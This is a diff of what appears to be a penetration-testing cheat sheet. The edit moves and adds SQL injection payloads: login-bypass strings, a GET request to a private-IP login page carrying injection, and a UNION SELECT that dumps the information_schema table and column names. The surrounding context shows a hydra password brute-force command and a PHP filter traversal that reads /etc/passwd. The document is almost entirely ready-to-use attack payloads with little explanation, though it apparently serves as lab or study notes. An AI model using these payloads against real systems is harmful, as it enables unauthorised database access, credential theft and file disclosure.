@@ -524,6 +524,14 @@ hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10k
 	 	.php?file=php://filter/convert.base64-encode/resource=../../../../../../../../../../../etc/passwd
 	     
 7.3.	      SQL Injection     #Examine how the server behaves
+
+POST Method -->
+
+
+Get Method --> via the url
+http://172.20.29.77/login.php?username=tom' OR 1='1 & passwd=tom ' or 1='1
+
+
 ' or '1'='1
 ' or 1=1-- -
 ' or 1=1 --	    
@@ -539,14 +547,11 @@ or 1=1 --
 ") or ("x"="x	      
 ' or username LIKE '%admin% 
 
-POST Method -->
+Identify how many columns
+	union select 1,2,3 ;#
 
-
-Get Method --> via the url
-http://172.20.29.77/login.php?username=tom' OR 1='1 & passwd=tom ' or 1='1
-
- http://172.20.22.134/uniondemo.php?Selection=2 union select table_schema,column_name,table_name from information_schema.columns 
-    union select table_schema,column_name,table_name from information_schema.columns 
+Golen statement
+	 http://172.20.22.134/uniondemo.php?Selection=2 union select table_schema,column_name,table_name from information_schema.columns union select table_schema,column_name,table_name from information_schema.columns 
 
 example
      mysql (to run MySQL)  
